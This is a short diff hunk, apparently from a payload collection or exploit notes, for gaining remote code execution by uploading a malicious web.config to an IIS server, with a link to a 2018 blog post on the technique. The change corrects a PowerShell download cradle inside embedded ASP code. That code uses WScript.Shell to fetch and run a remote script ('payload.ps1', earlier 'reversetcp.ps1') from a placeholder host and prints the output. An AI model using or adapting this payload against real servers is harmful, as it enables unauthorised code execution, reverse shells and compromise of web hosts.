@@ -25,7 +25,7 @@ https://poc-server.com/blog/2018/05/22/rce-by-uploading-a-web-config/
 </configuration>
 <%
 Set objShell = CreateObject("WScript.Shell")
-strCommand = "cmd /c powershell.exe -c IEX (New-ObjectNet.Webclient).downloadstring('http://<IP>/reversetcp.ps1')"
+strCommand = "cmd /c powershell.exe -c IEX (New-Object Net.Webclient).downloadstring('http://x.x.x.x/payload.ps1')"
 Set objShellExec = objShell.Exec(strCommand)
 strOutput = objShellExec.StdOut.ReadAll()
 WScript.StdOut.Write(strOutput)
